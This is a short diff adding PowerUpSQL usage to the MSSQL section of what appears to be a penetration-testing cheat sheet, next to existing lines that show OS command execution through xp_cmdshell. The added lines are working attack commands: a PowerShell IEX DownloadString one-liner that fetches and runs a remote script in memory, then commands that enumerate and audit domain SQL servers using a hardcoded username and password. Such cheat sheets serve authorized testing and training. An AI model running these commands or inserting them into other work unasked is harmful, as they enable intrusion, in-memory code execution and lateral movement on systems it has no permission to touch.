@@ -245,6 +245,10 @@ MSSQL
   `SQL> xp_cmdshell "whoami"` 
   `[...]`  
   `hostname\sql_svc`  
+  Using PowerUpSQL:  
+  `IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1')`  
+  `$Targets = Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 -username "domain\user" -password "passw0rd123" | Where-Object {$_.Status -like "Accessible"}`  
+`Invoke-SQLAudit -Verbose -Instance "servername.domain.local,1433"`  
   
 MySQL 
 - Enumerate tables:  
